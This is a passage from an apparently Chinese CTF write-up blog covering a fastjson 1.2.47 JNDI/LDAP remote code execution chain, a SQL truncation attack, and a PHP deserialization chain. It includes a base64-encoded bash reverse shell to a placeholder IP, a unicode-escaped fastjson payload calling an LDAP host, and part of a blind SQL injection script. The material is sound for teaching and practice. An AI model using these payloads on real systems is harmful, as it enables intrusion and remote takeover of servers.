flag+=<span class="built_in">chr</span>(mid)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r2=requests.post(url,data=data2,timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                top=mid-<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># user</span></span><br><span class="line"><span class="comment"># id,username,password</span></span><br><span class="line"><span class="comment"># no_0ne_kn0w_th1s</span></span><br></pre></td></tr></table></figure>


<p>登入之后是一个图像选择页面，测试了下发现图像接口存在目录穿越，读pom.xml</p>
<blockquote>
<p>../../../../../pom.xml</p>
</blockquote>
<p><img src="https://img.npfs06.top/20210317192251.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>刚好是有漏洞的版本 </p>
<p>参考连接：<a target="_blank" rel="noopener" href="https://www.redhatzone.com/ask/article/2914.html">https://www.redhatzone.com/ask/article/2914.html</a></p>
<p>工具下载链接：<a target="_blank" rel="noopener" href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE">https://github.com/CaijiOrz/fastjson-1.2.47-RCE</a></p>
<p>基本上照着参考链接做就能成功得到flag</p>
<p>我们要做的就是 <code>http -&gt; ldap -&gt; exploit.class -&gt;反弹shell</code></p>
<p><strong>第一步</strong></p>
<p>将下载的工具放在同一目录下</p>
<p><img src="https://img.npfs06.top/20210317193249.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>可以发现多了一个Exploit.calss文件，这是需要自己本地<code>javac Exploit.java</code>生成的</p>
<p>Exploit.java修改如下</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="title">Exploit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec( <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwL3h4eC54eHgueHh4Lnh4eC83Nzc3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);  <span class="comment">//这里就是一个反弹shell的命令，填的是服务器ip和监听端口</span></span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">void</span> <span class="function"><span class="title">main</span>(<span class="params"><span class="built_in">String</span>[] argv</span>)</span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>修改后，生成Exploit.class</p>
<p><strong>第二步</strong></p>
<p>开启HTTP服务</p>
<p><img src="https://img.npfs06.top/20210317193832.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>注意：这里是要在利用文件所在目录下开启http服务</p>
<p>这一步的作用就是启动http服务器，提供下载远程要调用的类</p>
<p><img src="https://img.npfs06.top/20210317195120.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>可以成功访问</p>
<p><strong>第三步</strong></p>
<p>开启ldap服务</p>
<p>同理，在当前目录下运行LDAP服务,修改IP为当前这台服务器的IP</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">java</span> -cp marshalsec-<span class="number">0</span>.<span class="number">0</span>.<span class="number">3</span>-SNAPSHOT-<span class="literal">all</span>.jar marshalsec.jndi.LDAPRefServer http://IP/#Exploit</span><br></pre></td></tr></table></figure>


<p><img src="https://img.npfs06.top/20210317194047.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>这里红框圈起来的地方需要注意一下，9999是自定义的ldap开启端口，不设置的话默认是1389，不过我在复现的时候发现，如果不指定端口的话，无法成功引用exploit文件</p>
<p><strong>第四步</strong></p>
<p>开启监听</p>
<p><img src="https://img.npfs06.top/20210317194321.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><strong>第五步</strong></p>
<p>getshell</p>
<p>通过测试，发现正常的json语句被过滤，需要进行编码转换，前几天p神的知识星球刚好有讲到</p>
<p><img src="https://img.npfs06.top/20210317195940.jpeg?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>这里用unicode编码绕过</p>
<p><img src="https://img.npfs06.top/20210317194617.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">roleJson=&#123;&quot;name&quot;:&#123;&quot;<span class="symbol">\u</span>0040<span class="symbol">\u</span>0074<span class="symbol">\u</span>0079<span class="symbol">\u</span>0070<span class="symbol">\u</span>0065&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;<span class="symbol">\u</span>0063<span class="symbol">\u</span>006f<span class="symbol">\u</span>006d<span class="symbol">\u</span>002e<span class="symbol">\u</span>0073<span class="symbol">\u</span>0075<span class="symbol">\u</span>006e<span class="symbol">\u</span>002e<span class="symbol">\u</span>0072<span class="symbol">\u</span>006f<span class="symbol">\u</span>0077<span class="symbol">\u</span>0073<span class="symbol">\u</span>0065<span class="symbol">\u</span>0074<span class="symbol">\u</span>002e<span class="symbol">\u</span>004a<span class="symbol">\u</span>0064<span class="symbol">\u</span>0062<span class="symbol">\u</span>0063<span class="symbol">\u</span>0052<span class="symbol">\u</span>006f<span class="symbol">\u</span>0077<span class="symbol">\u</span>0053<span class="symbol">\u</span>0065<span class="symbol">\u</span>0074<span class="symbol">\u</span>0049<span class="symbol">\u</span>006d<span class="symbol">\u</span>0070<span class="symbol">\u</span>006c&quot;&#125;,&quot;x&quot;:&#123;&quot;<span class="symbol">\u</span>0040<span class="symbol">\u</span>0074<span class="symbol">\u</span>0079<span class="symbol">\u</span>0070<span class="symbol">\u</span>0065&quot;:&quot;<span class="symbol">\u</span>0063<span class="symbol">\u</span>006f<span class="symbol">\u</span>006d<span class="symbol">\u</span>002e<span class="symbol">\u</span>0073<span class="symbol">\u</span>0075<span class="symbol">\u</span>006e<span class="symbol">\u</span>002e<span class="symbol">\u</span>0072<span class="symbol">\u</span>006f<span class="symbol">\u</span>0077<span class="symbol">\u</span>0073<span class="symbol">\u</span>0065<span class="symbol">\u</span>0074<span class="symbol">\u</span>002e<span class="symbol">\u</span>004a<span class="symbol">\u</span>0064<span class="symbol">\u</span>0062<span class="symbol">\u</span>0063<span class="symbol">\u</span>0052<span class="symbol">\u</span>006f<span class="symbol">\u</span>0077<span class="symbol">\u</span>0053<span class="symbol">\u</span>0065<span class="symbol">\u</span>0074<span class="symbol">\u</span>0049<span class="symbol">\u</span>006d<span class="symbol">\u</span>0070<span class="symbol">\u</span>006c&quot;,&quot;dataSourceName&quot;:&quot;ldap://xxx.xxx.xxx.xxx:9999/Exploit&quot;,&quot;<span class="symbol">\u</span>0061<span class="symbol">\u</span>0075<span class="symbol">\u</span>0074<span class="symbol">\u</span>006f<span class="symbol">\u</span>0043<span class="symbol">\u</span>006f<span class="symbol">\u</span>006d<span class="symbol">\u</span>006d<span class="symbol">\u</span>0069<span class="symbol">\u</span>0074&quot;:true&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>


<p>成功监听，</p>
<p><img src="https://img.npfs06.top/20210317194640.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="FBCTF2019-Products-Manager"><a href="#FBCTF2019-Products-Manager" class="headerlink" title="[FBCTF2019]Products Manager"></a>[FBCTF2019]Products Manager</h2><p>知识点：sql约束攻击</p>
<p>通过测试发现可以通过<code>add</code>添加产品信息，通过<code>view</code>查看产品信息</p>
<p>审计代码</p>
<p><img src="https://img.npfs06.top/20210318230747.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>其中给出了提示，flag在<code>facebook</code>中，但若想查询产品细节，需要产品的<code>Secret</code>值</p>
<h3 id="数据库字符串比较"><a href="#数据库字符串比较" class="headerlink" title="数据库字符串比较"></a>数据库字符串比较</h3><p><strong>在处理SQL中的字符串时，字符串末尾的空格字符都会被删除。换句话说，“cat”与“cat      ”几乎是等效的，这在大多数情况下是正确的，例如WHERE子句中的字符串或INSERT语句中的字符串。例如，以下语句的查询结果，与使用用户名“cat”进行查询时的结果是一样的。</strong></p>
<p><img src="https://img.npfs06.top/20210318231001.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>但是，除此之外也确实存在例外情况，例如LIKE子句。注意，对尾部空白字符的这种修剪操作，主要是在“字符串比较”期间进行的。这是因为，SQL会在内部使用空格来填充字符串，以便在比较之前使其它们的长度保持一致。</p>
<h3 id="INSERT截断"><a href="#INSERT截断" class="headerlink" title="INSERT截断"></a>INSERT截断</h3><p> <strong>在任意INSERT查询中，SQL会根据varchar(n)来限制字符串的最大长度，也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。例如，如果特定列的长度约束为“5”个字符，那么在插入字符串“facebook”时，实际上只能插入字符串的前5个字符，即“faceb”。</strong></p>
<p><img src="https://img.npfs06.top/20210318231504.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>查看view.php:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$name</span>) &amp;&amp; <span class="variable">$name</span> !== <span class="string">&quot;&quot;</span></span><br><span class="line">        &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$secret</span>) &amp;&amp; <span class="variable">$secret</span> !== <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (check_name_secret(<span class="variable">$name</span>, hash(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$secret</span>)) === <span class="literal">false</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;Incorrect name or secret, please try again&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$product</span> = get_product(<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Product details:&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;ul&gt;&lt;li&gt;&quot;</span> . htmlentities(<span class="variable">$product</span>[<span class="string">&#x27;name&#x27;</span>]) . <span class="string">&quot;&lt;/li&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;li&gt;&quot;</span> . htmlentities(<span class="variable">$product</span>[<span class="string">&#x27;description&#x27;</span>]) . <span class="string">&quot;&lt;/li&gt;&lt;/ul&gt;&lt;/p&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>跟进到/db.php::check_name_secret，源码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_name_secret</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$secret</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">  <span class="variable">$valid</span> = <span class="literal">false</span>;</span><br><span class="line">  <span class="variable">$statement</span> = <span class="variable">$db</span>-&gt;prepare(</span><br><span class="line">    <span class="string">&quot;SELECT name FROM products WHERE name = ? AND secret = ?&quot;</span></span><br><span class="line">  );</span><br><span class="line">  check_errors(<span class="variable">$statement</span>);</span><br><span class="line">  <span class="variable">$statement</span>-&gt;bind_param(<span class="string">&quot;ss&quot;</span>, <span class="variable">$name</span>, <span class="variable">$secret</span>);</span><br><span class="line">  check_errors(<span class="variable">$statement</span>-&gt;execute());</span><br><span class="line">  <span class="variable">$res</span> = <span class="variable">$statement</span>-&gt;get_result();</span><br><span class="line">  check_errors(<span class="variable">$res</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$res</span>-&gt;fetch_assoc() !== <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="variable">$valid</span> = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$statement</span>-&gt;close();</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$valid</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>   “SELECT name FROM products WHERE name = ? AND secret = ?”</p>
</blockquote>
<p>没有做什么过滤</p>
<p>/db.php::get_product源码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_product</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">  <span class="variable">$statement</span> = <span class="variable">$db</span>-&gt;prepare(</span><br><span class="line">    <span class="string">&quot;SELECT name, description FROM products WHERE name = ?&quot;</span></span><br><span class="line">  );</span><br><span class="line">  check_errors(<span class="variable">$statement</span>);</span><br><span class="line">  <span class="variable">$statement</span>-&gt;bind_param(<span class="string">&quot;s&quot;</span>, <span class="variable">$name</span>);</span><br><span class="line">  check_errors(<span class="variable">$statement</span>-&gt;execute());</span><br><span class="line">  <span class="variable">$res</span> = <span class="variable">$statement</span>-&gt;get_result();</span><br><span class="line">  check_errors(<span class="variable">$res</span>);</span><br><span class="line">  <span class="variable">$product</span> = <span class="variable">$res</span>-&gt;fetch_assoc();</span><br><span class="line">  <span class="variable">$statement</span>-&gt;close();</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$product</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>check的时候会将name和secret一并查询，但返回product时只查询name，所以此时便有了可利用点</p>
<p>于是我们可以添加一个facebook尾部带n个空格的product，添加成功后再进行查询，便能得到flag</p>
<h2 id="梦里花开牡丹亭"><a href="#梦里花开牡丹亭" class="headerlink" title="梦里花开牡丹亭"></a>梦里花开牡丹亭</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//include(&#x27;shell.php&#x27;);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>= <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span> = <span class="keyword">new</span> Open (<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span> = <span class="string">&quot;php://filter/convert.base64-encode/resource=shell&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span> ;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file= <span class="keyword">new</span> Open(<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_get_contents(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;</span><br><span class="line">            <span class="keyword">print</span>(<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="variable">$filename</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Game();</span><br><span class="line"><span class="keyword">print</span> (base64_encode(serialize(<span class="variable">$a</span>)));</span><br><span class="line"><span class="comment">//@unserialize(base64_decode($_POST[&#x27;unser&#x27;]));</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210322183621.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$cmd</span>)&lt;<span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> system(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;so long!&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;��<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
<p>去php文档里面找了之后发现有个ZipArchive内置类，里面有个open方法，可以删除文件</p>
<p><img src="https://img.npfs06.top/20210322184916.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210322184939.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;register = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&quot;waf.txt&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = ZipArchive::OVERWRITE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="keyword">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;choice=<span class="keyword">new</span> login(<span class="keyword">$this</span>-&gt;file,<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;choice = <span class="keyword">new</span> register();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">apen</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_get_contents(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;</span><br><span class="line">            shell(<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="variable">$filename</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$game</span> = <span class="keyword">new</span> Game();</span><br><span class="line"><span class="variable">$game</span> = serialize(<span class="variable">$game</span>);</span><br><span class="line"><span class="keyword">print</span>(base64_encode(<span class="variable">$game</span>));</span><br></pre></td></tr></table></figure>


<p><img src="https://img.npfs06.top/20210322183659.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>waf.txt文件被删除，我们在尝试读取下shell.php文件，可以发现是读取失败的，因为这个时候，<code>if</code>语句一直为真了</p>
<p><img src="https://img.npfs06.top/20210322183823.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>构造命令即可,因为<code>nl</code>被过滤了，我们可以用斜杠分隔</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//include(&#x27;shell.php&#x27;);</span></span><br><span class="line"><span class="class"><span 